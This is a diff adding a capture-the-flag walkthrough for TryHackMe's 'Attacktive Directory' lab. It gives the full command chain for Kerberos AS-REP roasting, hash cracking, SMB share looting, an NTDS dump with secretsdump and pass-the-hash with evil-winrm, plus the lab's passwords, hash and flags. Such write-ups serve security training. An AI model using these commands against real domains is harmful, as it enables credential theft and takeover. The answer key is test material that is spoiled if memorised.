@@ -2,3 +2,92 @@
 ### Link
 - https://tryhackme.com/room/attacktivedirectory
 ------------------------
+### Task 3 : Enumeration - Welcome to attacktive directory
+- sudo nmap -sC -sV -p- 10.10.151.128
+    - Picture: [attacktive_directory_walkthrough_1.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_1.png) , [attacktive_directory_walkthrough_2.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_2.png)
+- What tool will allow us to enumerate port 139/445?
+     - **Answer**: enum4linux
+- What is the NetBIOS-Domain Name of the machine?
+    - sudo enum4linux [IP]
+    - Picture: [attacktive_directory_walkthrough_3.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_3.png)
+        - **Answer** : THM-AD
+- What invalid TLD do people commonly use for their Active Directory Domain?
+    - ./kerbrute_linux_amd64 uerenum --dc spookysec.local -d spookysec.local [path]/users.txt -t 100
+    - **Answer** : .local
+------------------------
+### Task 4 : Enumeration - Enumerating users via kerberos
+- What notable account is discovered? (These should jump out at you)
+    - Picture: [attacktive_directory_walkthrough_4.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_4.png)
+    - **Answer**:svc-admin
+- What is the other notable account is discovered?
+    - **Answer**:backup
+------------------------
+### Task 5 : Exploitation - Abusing kerberos
+- Impacket has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center.
+    - GetNPUsers.py -no-pass -dc-ip 10.10.168.131 spookysec.local/svc-admin - Check on internet what is : $krb5asrep$23$
+    - Link: https://hashcat.net/wiki/doku.php?id=example_hashes
+    - Picture: [attacktive_directory_walkthrough_5.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_5.png)
+- Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC?
+    - Picture: [attacktive_directory_walkthrough_6.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_6.png)
+    - **Answer**:Kerberos 5 AS-REP etype 23
+- What mode is the hash?
+    - Picture: [attacktive_directory_walkthrough_7.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_7.png)
+    - **Answer**:18200
+- Now crack the hash with the modified password list provided, what is the user accounts password?
+    - sudo hashcat -m 18200 /media/sf_LOLO_Share/TryHackMe/Beginner/EASY/attacktivedirectory/svc-admin.hash /usr/share/wordlists/rockyou.txt
+    - **Answer**:management2005
+------------------------
+### Task 6 : Enumeration - Back to the basics
+- What utility can we use to map remote SMB shares?
+    - Picture: [attacktive_directory_walkthrough_8.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_8.png)
+    - **Answer**:smbclient
+- Which option will list shares?
+    - **Answer**: -L
+- How many remote shares is the server listing?
+    - Picture: [attacktive_directory_walkthrough_9.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_9.png)
+    - **Answer**: 6
+- There is one particular share that we have access to that contains a text file. Which share is it?
+    - Only way to find this particular share is to try all share ^_^
+        - smbclient //10.10.147.13/backup -U 'svc-admin'
+    - Picture: [attacktive_directory_walkthrough_10.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_10.png)
+    - **Answer**:backup
+- What is the content of the file?
+    - get backup_credentials.txt
+    - cat get backup_credentials.txt
+    - Picture: [attacktive_directory_walkthrough_11.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_11.png)
+    - **Answer**: YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+- Decoding the contents of the file, what is the full contents?
+    - Decode:
+        - echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
+        - Picture: [attacktive_directory_walkthrough_12.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_12.png)
+        - **Answer**:backup@spookysec.local:backup2517860
+------------------------
+### Task 7 : Domain Privilege Escalation - Elevating privileges with the domain
+- What method allowed us to dump NTDS.DIT?
+    - Let's check tools  available on Impacket
+    - Check this link : https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples
+    - You can find : secretsdump.py
+    - sudo secretsdump.py -dc-ip 10.10.75.253 spookysec.local/backup:backup2517860@10.10.75.253
+    - Picture: [attacktive_directory_walkthrough_13.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_13.png)
+        - **Answer**:DRSUAPI
+- What is the Administrators NTLM hash?
+    - **Answer**: 0e0363213e37b94221497260b0bcb4fc
+- What method of attack could allow us to authenticate as the user without the password?
+    - **Answer**: pass the hash
+- Using a tool called Evil-WinRM what option will allow us to use a hash?
+    - Picture: [attacktive_directory_walkthrough_14.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_14.png)
+    - **Answer**: -H
+------------------------
+### Task 8 : Flag submission - Flag submission panel
+- Gain access to the machine:
+    - ./evil-winrm.rb -i 10.10.185.230 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
+    - Picture: [attacktive_directory_walkthrough_15.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_15.png)
+- svc-admin flag
+    - Picture: [attacktive_directory_walkthrough_17.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_17.png)
+    - **Answer**:TryHackMe{K3rb3r0s_Pr3_4uth}
+- Administrator flag
+    - Picture: [attacktive_directory_walkthrough_16.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_16.png)
+    - **Answer**:TryHackMe{4ctiveD1rectoryM4st3r}
+- backup flag
+    - Picture: [attacktive_directory_walkthrough_18.png](https://github.com/LNB283/THM/blob/main/EASY/Attacktive%20Directory/Pictures/attacktive_directory_walkthrough_18.png)
+    - **Answer**:TryHackMe{B4ckM3UpSc0tty!}
